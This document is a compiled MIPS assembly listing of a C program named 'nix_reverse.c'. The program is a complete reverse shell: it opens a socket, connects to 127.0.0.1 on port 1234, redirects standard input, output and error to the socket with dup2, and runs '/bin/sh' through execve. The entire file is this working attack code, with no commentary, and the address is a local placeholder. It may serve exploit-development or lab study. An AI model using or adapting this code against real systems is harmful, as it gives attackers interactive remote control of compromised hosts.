	.file	1 "nix_reverse.c"
	.section .mdebug.abi32
	.previous
	.nan	legacy
	.module	fp=xx
	.module	nooddspreg
	.abicalls
	.section	.rodata.str1.4,"aMS",@progbits,1
	.align	2
$LC0:
	.ascii	"/bin/sh\000"
	.section	.text.startup,"ax",@progbits
	.align	2
	.globl	main
	.set	nomips16
	.set	nomicromips
	.ent	main
	.type	main, @function
main:
	.frame	$sp,56,$31		# vars= 24, regs= 2/0, args= 16, gp= 8
	.mask	0x80010000,-4
	.fmask	0x00000000,0
	.set	noreorder
	.cpload	$25
	.set	nomacro
	addiu	$sp,$sp,-56
	lw	$25,%call16(socket)($28)
	move	$6,$0
	li	$5,2			# 0x2
	sw	$31,52($sp)
	sw	$16,48($sp)
	.cprestore	16
	.reloc	1f,R_MIPS_JALR,socket
1:	jalr	$25
	li	$4,2			# 0x2

	li	$6,16			# 0x10
	move	$16,$2
	lw	$28,16($sp)
	li	$2,2			# 0x2
	addiu	$5,$sp,24
	sh	$2,24($sp)
	li	$2,1234			# 0x4d2
	lw	$25,%call16(connect)($28)
	move	$4,$16
	sh	$2,26($sp)
	li	$2,16777216			# 0x1000000
	addiu	$2,$2,127
	.reloc	1f,R_MIPS_JALR,connect
1:	jalr	$25
	sw	$2,28($sp)

	move	$5,$0
	lw	$28,16($sp)
	lw	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	move	$4,$16

	li	$5,1			# 0x1
	lw	$28,16($sp)
	lw	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	move	$4,$16

	li	$5,2			# 0x2
	lw	$28,16($sp)
	lw	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	move	$4,$16

	addiu	$5,$sp,40
	lw	$28,16($sp)
	move	$6,$0
	sw	$0,44($sp)
	lw	$4,%got($LC0)($28)
	lw	$25,%call16(execve)($28)
	addiu	$4,$4,%lo($LC0)
	.reloc	1f,R_MIPS_JALR,execve
1:	jalr	$25
	sw	$4,40($sp)

	move	$2,$0
	lw	$31,52($sp)
	lw	$16,48($sp)
	jr	$31
	addiu	$sp,$sp,56

	.set	macro
	.set	reorder
	.end	main
	.size	main, .-main
	.ident	"GCC: (Debian 6.3.0-18) 6.3.0 20170516"
